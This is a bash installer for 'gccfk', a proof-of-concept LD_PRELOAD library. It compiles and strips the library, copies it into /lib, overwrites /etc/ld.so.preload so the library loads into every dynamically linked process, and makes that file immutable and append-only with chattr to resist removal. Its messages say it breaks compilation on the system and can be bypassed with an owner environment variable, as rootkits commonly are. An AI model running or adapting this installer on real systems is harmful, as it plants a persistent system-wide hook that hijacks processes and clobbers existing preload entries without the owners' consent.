#!/bin/bash

[ $(id -u) != 0 ] && { echo "Not root. Exiting."; exit; }

read -p "Enter your desired install directory [/lib]: "
if [ -z $REPLY ]; then
    INSTALL_DIR="/lib"
else
    INSTALL_DIR=$REPLY
fi

echo "Compiling gccfk"

CFLAGS="-ldl"
WFLAGS="-Wall"
FFLAGS="-fomit-frame-pointer -fPIC"
gcc -std=gnu99 gccfk.c -O0 $WFLAGS $FFLAGS -shared $CFLAGS -Wl,--build-id=none -o gccfk.so
strip gccfk.so

echo "gccfk successfully configured and compiled."
echo "Installing gccfk.so to $INSTALL_DIR and injecting into ld.so.preload"

mv gccfk.so $INSTALL_DIR/
echo "$INSTALL_DIR/gccfk.so" > /etc/ld.so.preload
chattr +ia /etc/ld.so.preload

echo "gccfk successfully installed on the system."
echo "Try compiling something statically now. Good luck! (since this is a PoC, you can get by this just by calling execv in a Python script or something)"
echo "Remember you can remove it by setting your environment variable ($OWNER_ENV_VAR) in a root shell and removing ld.so.preload."
echo "Remember to run chattr -ia on ld.so.preload, or else you'll be unable to remove it. :p"
